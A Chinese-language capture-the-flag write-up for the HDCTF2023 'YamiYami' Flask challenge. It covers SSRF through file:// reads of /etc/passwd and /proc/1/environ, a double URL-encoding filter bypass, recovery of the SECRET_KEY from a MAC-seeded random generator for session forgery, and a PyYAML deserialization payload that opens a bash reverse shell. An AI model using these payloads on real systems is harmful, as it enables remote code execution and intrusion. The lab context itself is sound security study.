#### YamiYami

进入题目：

![image-20230423143948531](https://s2.loli.net/2023/04/23/nJmBkxYw3PaOfrF.png)

当我们点击 `Read somethings`时：

```
http://node2.anna.nssctf.cn:28523/read?url=https://baidu.com
```

我们发现可以读取到百度首页的内容，这是**SSRF**（突然忘记了）

python中我们可以使用 `file伪协议`读取文件内容

我们尝试一下读取 `/etc/passwd`

![image-20230423144508490](https://s2.loli.net/2023/04/23/gQ8YnFWyh2HAJak.png)



成功读取



非预期解：（直接读取环境变量）

```
file:///proc/1/environ   # 这里读的是pid为1的进程
```

![image-20230423144607816](https://s2.loli.net/2023/04/23/agHbZnvudWrm6to.png)



如果读取当前进程的环境变量是读取不到的：

![image-20230423145412951](https://s2.loli.net/2023/04/23/GRhokPMEr7q1J43.png)





[Linux-Proc目录的利用](https://xz.aliyun.com/t/10579)



预期解：

我们进去发现了三个路由，但是第一个read路由可以读取指定url的内容，易知这是`SSRF`

<img src="https://s2.loli.net/2023/04/28/qzVHPOj3irdvxa6.png" alt="image-20230428111516922" style="zoom:33%;" />

我们点击 pwd，显示 `/app`，说明此时文件在`/app`目录下面

由于这是python写的题，我们很容易猜到文件名是 `app.py`

于是我们想要使用file协议去读取 `/app/app.py`文件

![image-20230428111931565](https://s2.loli.net/2023/04/28/PtMrf3R9VyAcXQj.png)

结果`app`被过滤了

这里我们可以将 `app`字段**两次url编码绕过**

![image-20230428112210448](https://s2.loli.net/2023/04/28/WiY31ZKDaSOPXTe.png)

获得源码：

```python

#encoding:utf-8
import os
import re, random, uuid
from flask import *
from werkzeug.utils import *
import yaml
from urllib.request import urlopen
app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = False
BLACK_LIST=["yaml","YAML","YML","yml","yamiyami"]
app.config['UPLOAD_FOLDER']="/app/uploads"

@app.route('/')
def index():
    session['passport'] = 'YamiYami'
    return '''
    Welcome to HDCTF2023 <a href="/read?url=https://baidu.com">Read somethings</a>
    <br>
    Here is the challenge <a href="/upload">Upload file</a>
    <br>
    Enjoy it <a href="/pwd">pwd</a>
    '''
@app.route('/pwd')
def pwd():
    return str(pwdpath)
@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('app.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m:
            return "re.findall('app.*', url, re.IGNORECASE)"
        if n:
            return "re.findall('flag', url, re.IGNORECASE)"
        res = urlopen(url)
        return res.read()
    except Exception as ex:
        print(str(ex))
    return 'no response'

def allowed_file(filename):
   for blackstr in BLACK_LIST:
       if blackstr in filename:
           return False
   return True
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            return "Empty file"
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            if not os.path.exists('./uploads/'):
                os.makedirs('./uploads/')
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return "upload successfully!"
    return render_template("index.html")
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":
        LoadedFile=request.args.get("file")
        if not os.path.exists(LoadedFile):
            return "file not exists"
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
        return "van you see"
    else:
        return "No Auth bro"
if __name__=='__main__':
    pwdpath = os.popen("pwd").read()
    app.run(
        debug=False,
        host="0.0.0.0"
    )
    print(app.config['SECRET_KEY'])

```

我们阅读一下read路由的源码：

```python
url = request.args.get('url')
m = re.findall('app.*', url, re.IGNORECASE)
n = re.findall('flag', url, re.IGNORECASE)
if m:
return "re.findall('app.*', url, re.IGNORECASE)"
if n:
return "re.findall('flag', url, re.IGNORECASE)"
res = urlopen(url)
return res.read()
```

我们发现获得的url会使用 `urlopen()`去读取指定url的内容，因此，我们可以url编码两次，第一次浏览器自动解码，然后获得被编码一次的url，这时可以绕过 `re.findall()`正则，`urlopen()`函数可以解析包含urlencode的网址，这样我们知道为什么可以两次编码绕过了



```python
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
```

这一段代码，`random.seed()`函数将会指定一个随机数种子，如果是固定值的话，会产生伪随机，每次固定位置的随机数都是一样的

> `uuid.getnode()`函数用于获取网络接口的MAC地址。如果机器具有多个网络接口，则返回通用管理的MAC地址，而不是通过本地管理的MAC地址返回。管理的MAC地址保证是全局唯一的

`uuid.getnode()`可以用来获取网口的mac地址，因此是一个固定值，会生成伪随机，我们需要获取到mac地址

<img src="https://s2.loli.net/2023/04/28/g9OC581ytisKUVb.png" alt="image-20230428113423797" style="zoom:33%;" />

我们可以使用：

```
/sys/class/net/eth0/address
```

获取 eth0 网卡的mac地址

<img src="https://s2.loli.net/2023/04/28/KgwbrZAGf2TLnNk.png" alt="image-20230428113543582" style="zoom:33%;" />

这是16进制的值，于是我们可以使用脚本生成 `SECRET_KEY`的值了：

```python
import random
import uuid

random.seed(0x0242ac025164)
print(random.random()*233)

# 16.703189614984886
```

得到key，我们可以使用 session伪造脚本伪造session了

![image-20230428113758500](https://s2.loli.net/2023/04/28/DZgrlOKW5UNcuYe.png)

```python
@app.route('/boogipop')
def load():
    if session.get("passport")=="Welcome To HDCTF2023":
        LoadedFile=request.args.get("file")
        if not os.path.exists(LoadedFile):
            return "file not exists"
        with open(LoadedFile) as f:
            yaml.full_load(f)
            f.close()
```

这里主要利用 `boogipop`路由，**yaml反序列化**

这个暂时不太会，直接放payload：

```python
!!python/object/new:str
    args: []
    state: !!python/tuple
      - "__import__('os').system('bash -c \"bash -i >& /dev/tcp/ip/port <&1\"')"
      - !!python/object/new:staticmethod
        args: []
        state:
          update: !!python/name:eval
          items: !!python/name:list
```

我们将IP、port改为自己的，然后在服务器开启监听，上传这个文件，然后利用boogipop路由即可：

![image-20230428114313417](https://s2.loli.net/2023/04/28/nQA2lsXBJGfk61V.png)

注意改一下session

![image-20230428114353862](https://s2.loli.net/2023/04/28/hyZczEaUOAr6G3V.png)

在	`/proc/1/environ` 发现flag